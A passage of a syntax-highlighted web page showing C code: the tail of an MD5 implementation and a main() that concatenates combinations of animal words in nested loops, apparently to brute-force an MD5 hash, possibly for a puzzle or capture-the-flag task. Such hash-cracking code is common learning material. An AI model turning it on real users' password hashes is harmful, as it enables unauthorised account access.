number\">23</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xc4ac5665</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 48 */</span></pre></td></tr><tr><td data-num=\"139\"></td><td><pre> </pre></td></tr><tr><td data-num=\"140\"></td><td><pre> <span class=\"token comment\">/* Round 4 */</span></pre></td></tr><tr><td data-num=\"141\"></td><td><pre> <span class=\"token function\">II</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span> <span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xf4292244</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 49 */</span></pre></td></tr><tr><td data-num=\"142\"></td><td><pre> <span class=\"token function\">II</span><span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span> <span class=\"token number\">7</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x432aff97</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 50 */</span></pre></td></tr><tr><td data-num=\"143\"></td><td><pre> <span class=\"token function\">II</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">15</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xab9423a7</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 51 */</span></pre></td></tr><tr><td data-num=\"144\"></td><td><pre> <span class=\"token function\">II</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span> <span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">21</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xfc93a039</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 52 */</span></pre></td></tr><tr><td data-num=\"145\"></td><td><pre> <span class=\"token function\">II</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x655b59c3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 53 */</span></pre></td></tr><tr><td data-num=\"146\"></td><td><pre> <span class=\"token function\">II</span><span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x8f0ccc92</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 54 */</span></pre></td></tr><tr><td data-num=\"147\"></td><td><pre> <span class=\"token function\">II</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">15</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xffeff47d</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 55 */</span></pre></td></tr><tr><td data-num=\"148\"></td><td><pre> <span class=\"token function\">II</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">21</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x85845dd1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 56 */</span></pre></td></tr><tr><td data-num=\"149\"></td><td><pre> <span class=\"token function\">II</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span> <span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6fa87e4f</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 57 */</span></pre></td></tr><tr><td data-num=\"150\"></td><td><pre> <span class=\"token function\">II</span><span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xfe2ce6e0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 58 */</span></pre></td></tr><tr><td data-num=\"151\"></td><td><pre> <span class=\"token function\">II</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span> <span class=\"token number\">6</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">15</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xa3014314</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 59 */</span></pre></td></tr><tr><td data-num=\"152\"></td><td><pre> <span class=\"token function\">II</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">21</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4e0811a1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 60 */</span></pre></td></tr><tr><td data-num=\"153\"></td><td><pre> <span class=\"token function\">II</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span> <span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xf7537e82</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 61 */</span></pre></td></tr><tr><td data-num=\"154\"></td><td><pre> <span class=\"token function\">II</span><span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xbd3af235</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 62 */</span></pre></td></tr><tr><td data-num=\"155\"></td><td><pre> <span class=\"token function\">II</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">15</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2ad7d2bb</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 63 */</span></pre></td></tr><tr><td data-num=\"156\"></td><td><pre> <span class=\"token function\">II</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span> <span class=\"token number\">9</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">21</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xeb86d391</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 64 */</span></pre></td></tr><tr><td data-num=\"157\"></td><td><pre>     state<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> a<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"158\"></td><td><pre>     state<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> b<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"159\"></td><td><pre>     state<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> c<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"160\"></td><td><pre>     state<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> d<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"161\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"162\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"163\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span></pre></td></tr><tr><td data-num=\"164\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">\"md5.h\"</span></span></pre></td></tr><tr><td data-num=\"165\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/types.h></span></span></pre></td></tr><tr><td data-num=\"166\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/stat.h></span></span></pre></td></tr><tr><td data-num=\"167\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;fcntl.h></span></span></pre></td></tr><tr><td data-num=\"168\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;string.h></span></span></pre></td></tr><tr><td data-num=\"169\"></td><td><pre> </pre></td></tr><tr><td data-num=\"170\"></td><td><pre> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span> <span class=\"token keyword\">void</span> <span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"171\"></td><td><pre> <span class=\"token punctuation\">&#123;</span> </pre></td></tr><tr><td data-num=\"172\"></td><td><pre>    <span class=\"token keyword\">int</span> read_len<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"173\"></td><td><pre>    <span class=\"token keyword\">int</span> i <span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"174\"></td><td><pre>   <span class=\"token keyword\">char</span> temp<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">0</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"175\"></td><td><pre>    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> digest<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// å­˜æ”¾ç»“æœ </span></pre></td></tr><tr><td data-num=\"176\"></td><td><pre>     <span class=\"token keyword\">char</span> hexbuf<span class=\"token punctuation\">[</span><span class=\"token number\">128</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">0</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"177\"></td><td><pre>     <span class=\"token keyword\">int</span> len <span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"178\"></td><td><pre>     <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span><span class=\"token number\">6</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"179\"></td><td><pre>        <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> j<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>j<span class=\"token operator\">&lt;</span><span class=\"token number\">6</span><span class=\"token punctuation\">;</span>j<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"180\"></td><td><pre>            <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> k<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>k<span class=\"token operator\">&lt;</span><span class=\"token number\">6</span><span class=\"token punctuation\">;</span>k<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"181\"></td><td><pre>             <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> l<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>l<span class=\"token operator\">&lt;</span><span class=\"token number\">6</span><span class=\"token punctuation\">;</span>l<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"182\"></td><td><pre>              <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> ii<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>ii<span class=\"token operator\">&lt;</span><span class=\"token number\">6</span><span class=\"token punctuation\">;</span>ii<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"183\"></td><td><pre>               <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> jj<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>jj<span class=\"token operator\">&lt;</span><span class=\"token number\">6</span><span class=\"token punctuation\">;</span>jj<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"184\"></td><td><pre>                <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> kk<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>kk<span class=\"token operator\">&lt;</span><span class=\"token number\">6</span><span class=\"token punctuation\">;</span>kk<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"185\"></td><td><pre>                 <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> ll<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>ll<span class=\"token operator\">&lt;</span><span class=\"token number\">6</span><span class=\"token punctuation\">;</span>ll<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"186\"></td><td><pre>                  <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> iii<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>iii<span class=\"token operator\">&lt;</span><span class=\"token number\">6</span><span class=\"token punctuation\">;</span>iii<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"187\"></td><td><pre>                    <span class=\"token keyword\">int</span> len<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"188\"></td><td><pre>                <span class=\"token keyword\">char</span>    hexbuf<span class=\"token punctuation\">[</span><span class=\"token number\">128</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">0</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"189\"></td><td><pre>                    <span class=\"token keyword\">switch</span> <span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"190\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">0</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"191\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'c'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"192\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'a'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"193\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'t'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"194\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"195\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">1</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"196\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'d'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"197\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'o'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"198\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'g'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"199\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"200\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">2</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"201\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'f'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"202\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'o'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"203\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'x'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"204\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"205\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">3</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"206\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'p'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"207\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'a'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"208\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'n'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"209\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'d'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"210\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'a'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"211\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"212\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">4</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"213\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'d'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"214\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'r'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"215\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'a'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"216\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'g'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"217\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'o'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"218\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'n'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"219\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"220\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">5</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"221\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'m'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"222\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'o'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"223\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'n'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"224\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'k'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"225\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'e'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"226\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'y'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"227\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"228\"></td><td><pre>        <span class=\"token keyword\">default</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"229\"></td><td><pre>            <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Invalid choice\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"230\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"231\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span>           <span class=\"token keyword\">switch</span> <span class=\"token punctuation\">(</span>j<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"232\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">0</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"233\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'c'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"234\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'a'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"235\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'t'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"236\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"237\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">1</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"238\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'d'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"239\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'o'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"240\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'g'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"241\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token 